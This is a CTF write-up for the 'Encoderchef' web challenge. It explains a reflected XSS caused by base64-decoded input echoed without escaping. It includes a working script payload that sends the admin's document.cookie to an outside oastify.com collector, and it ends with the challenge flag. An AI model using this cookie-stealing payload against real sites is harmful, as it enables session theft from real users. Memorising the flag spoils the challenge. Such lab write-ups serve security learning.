---
title: "Encoderchef"
description: "I heard Cyberchef is monitored by GCHQ so I am trying to build my own version. It is still under construction so if you see any problems with the site just send a link to the admin and they will have a look :) // (Flag is in admin cookie)"
pubDate: 2023-12-30
ctf: "PotluckCTF 37C3"
category: "rev"
author: "sealldev"
section: "CTFs"
image: "images/23-potluckctf37c3/icon.png"
---

Our site is a converter of text to various formats, like base64, hex, binary, etc.

![Converter](images/23-potluckctf37c3/encoderchef_1.png)

We are also given the source code of the page, aswell as an 'admin' page. This 'admin' page has a URL input for the admin to visit.

![Admin URL Visiting Page](images/23-potluckctf37c3/encoderchef_2.png)

If we can find an exploit to steal the admin's cookies (as they said in the description). We get the flag!

```php
$output = "Example output";
if ((isset($_GET["input"]) && !is_null($_GET["input"])) && (isset($_GET["encoding"]) && !is_null($_GET["encoding"]))){
	$input = base64_decode($_GET["input"]);

	if($input === false){
		$output = "Invalid input";
	} else {
		switch ($_GET["encoding"]) {
			case "base64":
				$output = base64_encode($input);
				break;
```
A portion of the code catches my eye, specifically the base64 input. If we can put in a base64 input that decodes to HTML tags, we can cause an XSS!

Payload:

```html
</textarea>
<script>
i=document.createElement("img");
i.src="https://******************************.oastify.com?c="+btoa(document.cookie);
document.body.appendChild(i);
</script>
<textarea>
```

Encoding our payload with Base64 and then URL encoding it, and making a final url gives us this: `http://[url]:31337/?encoding=base64&input=[payload]`

And sending it to the admin, sends us back our Base64 encoded cookies with our flag!

Flag: `flag="potluck{uu_make_me_go_crazy}"`